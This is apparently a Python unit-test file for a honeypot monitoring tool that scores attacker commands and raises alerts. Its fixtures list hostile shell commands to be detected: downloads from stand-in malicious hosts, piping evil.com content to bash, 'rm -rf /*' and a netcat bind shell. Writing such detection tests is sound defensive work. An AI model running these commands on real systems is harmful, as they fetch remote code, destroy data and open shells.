#!/usr/bin/env python3
"""
Unit tests for Real-time Monitor module
Tests the threat detection engine and real-time monitoring functionality
"""

import unittest
import sys
import os
import tempfile
import json
from datetime import datetime
from unittest.mock import patch, MagicMock

# Add parent directory to path to import modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from realtime_monitor import ThreatDetectionEngine, RealTimeMonitor, AlertManager


class TestThreatDetectionEngine(unittest.TestCase):
    """Test cases for ThreatDetectionEngine class"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.engine = ThreatDetectionEngine()
    
    def test_analyze_malicious_command(self):
        """Test analysis of malicious commands"""
        malicious_commands = [
            "wget http://malicious.com/backdoor.sh",
            "rm -rf /*",
            "curl -s https://evil.com/payload | bash",
            "nc -lvp 4444 -e /bin/bash"
        ]
        
        for command in malicious_commands:
            with self.subTest(command=command):
                analysis = self.engine.analyze_command(
                    command, 
                    "test_session", 
                    datetime.now()
                )
                
                # Should detect some level of threat
                self.assertGreater(analysis['threat_level'], 0)
                self.assertIsInstance(analysis['detected_attacks'], list)
                self.assertIsInstance(analysis['risk_score'], int)
                self.assertIn('session_profile', analysis)
    
    def test_analyze_benign_command(self):
        """Test analysis of benign commands"""
        benign_commands = [
            "ls -la",
            "pwd",
            "whoami",
            "echo hello"
        ]
        
        for command in benign_commands:
            with self.subTest(command=command):
                analysis = self.engine.analyze_command(
                    command,
                    "test_session",
                    datetime.now()
                )
                
                # Should have low or zero threat level
                self.assertLessEqual(analysis['threat_level'], 20)
    
    def test_behavioral_pattern_detection(self):
        """Test behavioral pattern detection across multiple commands"""
        session_id = "behavioral_test_session"
        timestamp = datetime.now()
        
        # Simulate reconnaissance pattern
        recon_commands = ["ls", "ps", "netstat", "whoami", "id", "uname"]
        
        for i, command in enumerate(recon_commands):
            analysis = self.engine.analyze_command(command, session_id, timestamp)
            
            # As we add more reconnaissance commands, threat level should increase
            if i >= 4:  # After threshold is reached
                self.assertIn('reconnaissance', analysis['detected_attacks'])
    
    def test_session_profiling(self):
        """Test session profiling functionality"""
        session_id = "profile_test_session"
        timestamp = datetime.now()
        
        # Execute a command to create session profile
        self.engine.analyze_command("test command", session_id, timestamp)
        
        # Check that session profile was created
        self.assertIn(session_id, self.engine.session_profiles)
        profile = self.engine.session_profiles[session_id]
        
        self.assertIn('commands', profile)
        self.assertIn('start_time', profile)
        self.assertIn('risk_indicators', profile)
        self.assertEqual(len(profile['commands']), 1)


class TestRealTimeMonitor(unittest.TestCase):
    """Test cases for RealTimeMonitor class"""
    
    def setUp(self):
        """Set up test fixtures"""
        # Create temporary log file
        self.temp_log = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False)
        self.temp_log.close()
        
        # Create mock alert queue
        self.mock_queue = MagicMock()
        
        self.monitor = RealTimeMonitor(self.temp_log.name, self.mock_queue)
    
    def tearDown(self):
        """Clean up test fixtures"""
        os.unlink(self.temp_log.name)
    
    def test_analyze_command_event(self):
        """Test analysis of command input events"""
        test_event = {
            'eventid': 'cowrie.command.input',
            'timestamp': datetime.now().isoformat(),
            'input': 'wget http://malicious.com/backdoor.sh',
            'session': 'test_session',
            'src_ip': '192.168.1.100'
        }
        
        # Should not raise an exception
        self.monitor.analyze_event(test_event)
    
    def test_analyze_login_event(self):
        """Test analysis of failed login events"""
        test_event = {
            'eventid': 'cowrie.login.failed',
            'timestamp': datetime.now().isoformat(),
            'username': 'admin',
            'password': 'password',
            'src_ip': '192.168.1.100'
        }
        
        # Should not raise an exception
        self.monitor.analyze_event(test_event)
    
    def test_suspicious_login_detection(self):
        """Test detection of suspicious login patterns"""
        # Test with suspicious username/password combinations
        suspicious_combos = [
            ('admin', 'password'),
            ('root', '123456'),
            ('administrator', 'admin'),
            ('user', 'qwerty')
        ]
        
        for username, password in suspicious_combos:
            with self.subTest(username=username, password=password):
                is_suspicious = self.monitor.is_suspicious_login_pattern(
                    '192.168.1.100', username, password
                )
                self.assertTrue(is_suspicious)
    
    def test_process_log_entries(self):
        """Test processing of new log entries"""
        # Write test log entries
        test_entries = [
            {
                'eventid': 'cowrie.command.input',
                'timestamp': datetime.now().isoformat(),
                'input': 'ls -la',
                'session': 'test_session',
                'src_ip': '192.168.1.100'
            },
            {
                'eventid': 'cowrie.login.failed',
                'timestamp': datetime.now().isoformat(),
                'username': 'admin',
                'password': 'password',
                'src_ip': '192.168.1.100'
            }
        ]
        
        with open(self.temp_log.name, 'w') as f:
            for entry in test_entries:
                f.write(json.dumps(entry) + '\n')
        
        # Reset file position to beginning
        self.monitor.file_position = 0
        
        # Should not raise an exception
        self.monitor.process_new_log_entries()


class TestAlertManager(unittest.TestCase):
    """Test cases for AlertManager class"""
    
    def setUp(self):
        """Set up test fixtures"""
        # Create temporary config file
        self.temp_config = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False)
        test_config = {
            "email": {
                "enabled": False,
                "smtp_server": "smtp.test.com",
                "smtp_port": 587,
                "username": "test@test.com",
                "password": "testpass",
                "recipients": ["admin@test.com"]
            },
            "thresholds": {
                "high_threat_alert": 50,
                "critical_threat_alert": 80
            }
        }
        json.dump(test_config, self.temp_config)
        self.temp_config.close()
        
        self.alert_manager = AlertManager(config_file=self.temp_config.name)
    
    def tearDown(self):
        """Clean up test fixtures"""
        os.unlink(self.temp_config.name)
    
    def test_config_loading(self):
        """Test configuration loading"""
        config = self.alert_manager.config
        
        self.assertIn('email', config)
        self.assertIn('thresholds', config)
        self.assertEqual(config['thresholds']['high_threat_alert'], 50)
    
    def test_handle_alert(self):
        """Test alert handling"""
        test_alert = {
            'type': 'high_threat_command',
            'timestamp': datetime.now().isoformat(),
            'src_ip': '192.168.1.100',
            'threat_level': 75,
            'command': 'rm -rf /*',
            'detected_attacks': ['privilege_escalation']
        }
        
        # Should not raise an exception
        self.alert_manager.handle_alert(test_alert)
        
        # Check that alert was added to history
        self.assertIn(test_alert, self.alert_manager.alert_history)
    
    @patch('sqlite3.connect')
    def test_log_alert_to_db(self, mock_connect):
        """Test logging alerts to database"""
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_connect.return_value = mock_conn
        mock_conn.cursor.return_value = mock_cursor
        
        test_alert = {
            'type': 'test_alert',
            'timestamp': datetime.now().isoformat(),
            'src_ip': '192.168.1.100',
            'threat_level': 50
        }
        
        # Should not raise an exception
        self.alert_manager.log_alert_to_db(test_alert)
        
        # Verify database operations were called
        mock_connect.assert_called_once()
        mock_cursor.execute.assert_called()
        mock_conn.commit.assert_called_once()


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
